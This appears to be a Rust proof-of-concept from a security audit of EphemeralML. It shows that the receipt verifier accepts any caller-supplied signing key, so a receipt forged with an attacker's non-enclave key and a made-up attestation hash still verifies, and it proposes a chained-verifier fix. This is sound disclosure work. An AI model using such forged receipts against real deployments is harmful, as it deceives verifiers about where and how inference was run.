//! Attack #16 — F6 (EphemeralML signing-key chain unbound)
//!
//! EphemeralML soundness finding **E-4**: the verifier does not check
//! that the receipt-signing pubkey was bound into the hardware
//! attestation `user_data` along the way to the caller. The chain of
//! custody between the Nitro NSM attestation document (which a real
//! deployment would verify) and the Ed25519 pubkey used to verify the
//! AIR v1 receipt is **deferred to the caller**.
//!
//! Demonstrates that:
//!   - `ephemeral_ml_common::air_verify::verify_air_v1_receipt`
//!     accepts a `verifying_key: &VerifyingKey` parameter and verifies
//!     the receipt's signature against it.
//!   - Nothing in the verifier API enforces that this `verifying_key`
//!     was extracted from a Nitro NSM attestation document the caller
//!     has independently verified.
//!   - A dishonest prover generates an Ed25519 key entirely outside
//!     any TEE, signs an AIR v1 receipt with it, sends it to the
//!     verifier alongside the matching public key, and the verifier
//!     happily accepts the receipt.
//!
//! Complement to Attack 8 (nearai `tls_verifier.py` opt-in): both
//! show F6, but in different shapes. Attack 8 is about the *live TLS
//! channel* not being checked against the attested key; Attack 16 is
//! about the *receipt-signing key itself* never being checked against
//! the hardware attestation document at the verifier API level.
//!
//! EphemeralML's source is NOT modified; the PoC uses the published
//! crate API of `ephemeral-ml-common`.

use ed25519_dalek::SigningKey;
use ephemeral_ml_common::air_receipt::{build_air_v1, AirReceiptClaims};
use ephemeral_ml_common::air_verify::{verify_air_v1_receipt, AirVerifyPolicy};
use ephemeral_ml_common::receipt_signing::{EnclaveMeasurements, ReceiptSigningKey};
use rand::rngs::OsRng;

const ISS: &str = "cyntrisec.com";
const MODEL_ID: &str = "mistral-7b-instruct-v0.3";
const POLICY_VERSION: &str = "policy-2026.02";

fn make_claims(
    model_hash: [u8; 32],
    request_hash: [u8; 32],
    response_hash: [u8; 32],
    cti: [u8; 16],
    iat: u64,
    attestation_doc_hash: [u8; 32],
) -> AirReceiptClaims {
    AirReceiptClaims {
        iss: ISS.to_string(),
        iat,
        cti,
        eat_nonce: None,
        model_id: MODEL_ID.to_string(),
        model_version: "1.0.0".to_string(),
        model_hash,
        request_hash,
        response_hash,
        attestation_doc_hash,
        enclave_measurements: EnclaveMeasurements::new(
            vec![0x01; 48],
            vec![0x02; 48],
            vec![0x03; 48],
        ),
        policy_version: POLICY_VERSION.to_string(),
        sequence_number: 1,
        execution_time_ms: 116,
        memory_peak_mb: 512,
        security_mode: "production".to_string(),
        model_hash_scheme: Some("sha256-single".to_string()),
    }
}

fn current_ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn main() {
    println!("================================================================");
    println!("EphemeralML F6 PoC — signing-key chain unbound (Attack #16)");
    println!("================================================================");
    println!();
    println!("Driving the REAL, unmodified function:");
    println!("    ephemeral_ml_common::air_verify::verify_air_v1_receipt");
    println!("    (see EphemeralML/common/src/air_verify.rs:328)");
    println!();

    // ---- The dishonest prover generates an Ed25519 key locally. ----
    //
    // No NSM attestation document has ever named this key. It was
    // never inside any enclave. It was generated on a regular host,
    // by a regular `cargo run`, by an attacker.
    let attacker_raw = SigningKey::generate(&mut OsRng);
    let attacker_key = ReceiptSigningKey::from_parts(
        attacker_raw.clone(),
        attacker_raw.verifying_key(),
    );
    let attacker_verifying_key = attacker_raw.verifying_key();

    println!("[+] Attacker-controlled Ed25519 key (never inside any enclave):");
    println!("        pubkey = {}",
        hex::encode(attacker_verifying_key.to_bytes()));
    println!();

    // ---- The attacker signs a structurally-valid AIR receipt with it.
    //
    // The `attestation_doc_hash` field is operator-chosen — there is
    // no enforcement at the air_verify layer that this value
    // corresponds to a real NSM attestation document anyone has seen.
    let model_hash: [u8; 32] = [0x11; 32];
    let request_hash: [u8; 32] = [0x33; 32];
    let response_hash: [u8; 32] = [0x55; 32];
    let fake_attestation_doc_hash: [u8; 32] = *b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    let now = current_ts();

    let receipt = build_air_v1(
        &make_claims(
            model_hash,
            request_hash,
            response_hash,
            *b"f6-attacker-cti1",
            now,
            fake_attestation_doc_hash,
        ),
        &attacker_key,
    )
    .expect("build receipt");

    println!("[+] AIR v1 receipt signed by attacker_key:");
    println!("        bytes:                  {}", receipt.len());
    println!("        attestation_doc_hash:   {}",
        hex::encode(fake_attestation_doc_hash));
    println!("        (attestation_doc_hash is whatever the attacker chose;");
    println!("         nothing in air_verify cross-checks this against a")  ;
    println!("         real Nitro NSM document.)");
    println!();

    // ---- The verifier calls verify_air_v1_receipt with the attacker
    // pubkey it received alongside the receipt. ----
    //
    // This is the realistic deployment shape: the SDK/operator hands
    // the verifier `(receipt, pubkey)` and the verifier passes the
    // pubkey directly into `verify_air_v1_receipt`. Where the pubkey
    // came from is "outside the scope" of this API call.
    println!("================================================================");
    println!("Scenario 1 — Verifier calls verify_air_v1_receipt with the");
    println!("             attacker-supplied pubkey (default policy)");
    println!("================================================================");
    let default_policy = AirVerifyPolicy::default();
    let r_default = verify_air_v1_receipt(&receipt, &attacker_verifying_key, &default_policy);
    println!();
    println!("    verify_air_v1_receipt(receipt, attacker_pubkey, default_policy)");
    println!("        verified = {}", r_default.verified);
    if !r_default.verified {
        println!("    [!] Default-policy scenario did not behave as expected.");
        std::process::exit(2);
    }
    println!("    [+] Receipt verifies. The attacker's key passed in is what");
    println!("        the receipt was signed by, so the signature check ✓.");
    println!("        Nothing else in this API call validates that the key");
    println!("        was ever part of an NSM attestation document.");
    println!();

    // ---- Scenario 2: even with the most-strict deployable policy
    // (pinning model_hash, request_hash, etc.), the verifier still
    // accepts an attacker-supplied verifying_key.
    println!("================================================================");
    println!("Scenario 2 — Strict policy pinning model_hash, request_hash,");
    println!("             response_hash, but NOT expected_attestation_doc_hash");
    println!("             (the realistic case: the verifier doesn't know which");
    println!("             NSM doc to pin until *after* it sees the receipt)");
    println!("================================================================");
    let strict_policy = AirVerifyPolicy {
        expected_model_hash: Some(model_hash),
        expected_request_hash: Some(request_hash),
        expected_response_hash: Some(response_hash),
        // expected_attestation_doc_hash is left None on purpose:
        // a real verifier learns this hash only by independently
        // fetching and verifying the Nitro NSM doc — a step that
        // happens *outside* verify_air_v1_receipt. The PoC's claim
        // is that the verifier API does not force the caller to do
        // this step.
        ..AirVerifyPolicy::default()
    };
    let r_strict = verify_air_v1_receipt(&receipt, &attacker_verifying_key, &strict_policy);
    println!();
    println!("    verify_air_v1_receipt(receipt, attacker_pubkey, strict_policy)");
    println!("        verified = {}", r_strict.verified);
    if !r_strict.verified {
        println!("    [!] Strict-policy scenario did not behave as expected.");
        std::process::exit(2);
    }
    println!("    [+] Receipt STILL verifies. The strict policy pinned every");
    println!("        receipt-content field the verifier knows about. But");
    println!("        the policy has no field that says \"this verifying_key");
    println!("        must come from a Nitro NSM document I verified.\"");
    println!();

    // ---- Scenario 3: pin expected_attestation_doc_hash. This is the
    // closest a verifier can get inside `air_verify` to chain-checking
    // the key — but it doesn't actually validate the key, only that
    // the *claims* in the receipt name a doc the verifier expects.
    println!("================================================================");
    println!("Scenario 3 — Verifier additionally pins expected_attestation_doc_hash");
    println!("             — but to what? The hash is operator-supplied bytes");
    println!("================================================================");
    let policy_with_adhash = AirVerifyPolicy {
        expected_model_hash: Some(model_hash),
        expected_request_hash: Some(request_hash),
        expected_response_hash: Some(response_hash),
        // The verifier pins to the same hash the attacker put in the
        // receipt. If the verifier got this hash from a Nitro NSM
        // document they independently verified, that would close the
        // chain. But the verifier here pins to whatever value they
        // were told — they could have been told the attacker's value
        // by the same operator who supplied the receipt.
        expected_attestation_doc_hash: Some(fake_attestation_doc_hash),
        ..AirVerifyPolicy::default()
    };
    let r_adhash = verify_air_v1_receipt(&receipt, &attacker_verifying_key, &policy_with_adhash);
    println!();
    println!("    verify_air_v1_receipt(receipt, attacker_pubkey, policy_with_adhash)");
    println!("        verified = {}", r_adhash.verified);
    if !r_adhash.verified {
        println!("    [!] Expected the receipt to verify under operator-supplied");
        println!("        attestation_doc_hash; saw verified=false.");
        std::process::exit(2);
    }
    println!("    [+] Receipt verifies. Even when the policy pins");
    println!("        expected_attestation_doc_hash, the chain is still broken:");
    println!("        the verifier is pinning the hash to a value they got");
    println!("        from *somewhere*, and `air_verify` has no way to assert");
    println!("        that the somewhere was a verified NSM document and");
    println!("        that the document actually names this Ed25519 key.");
    println!();
    println!("    The missing piece is OUTSIDE air_verify: a helper that");
    println!("    takes (NSM-attestation-doc, expected_PCRs, verifying_key)");
    println!("    and asserts that verifying_key was the one bound into the");
    println!("    NSM doc's `user_data`. EphemeralML's verifier API does not");
    println!("    ship such a helper; documentation describes the binding as");
    println!("    \"deferred to the caller.\"");
    println!();

    println!("================================================================");
    println!("Result");
    println!("================================================================");
    println!();
    println!("    [+] ATTACK CONFIRMED (P10, F6 — signing-key chain unbound)");
    println!();
    println!("    `verify_air_v1_receipt(receipt, verifying_key, policy)`");
    println!("    treats `verifying_key` as an input parameter, not as");
    println!("    something it derives from a verified hardware attestation");
    println!("    document. A caller that forgets the chain step accepts");
    println!("    any receipt signed by any key, regardless of whether");
    println!("    that key has any TEE provenance.");
    println!();
    println!("    Fix: ship a chained verifier in the EphemeralML SDK that");
    println!("    REQUIRES a NSM attestation document as input, verifies");
    println!("    its signature against AWS Nitro CA, parses the");
    println!("    receipt-signing pubkey out of the document's user_data,");
    println!("    and only then calls `verify_air_v1_receipt`. A pattern");
    println!("    like Tinfoil's `TLSBoundRoundTripper` — but for the");
    println!("    receipt-signing-key chain rather than the TLS channel —");
    println!("    would close this gap.");
}
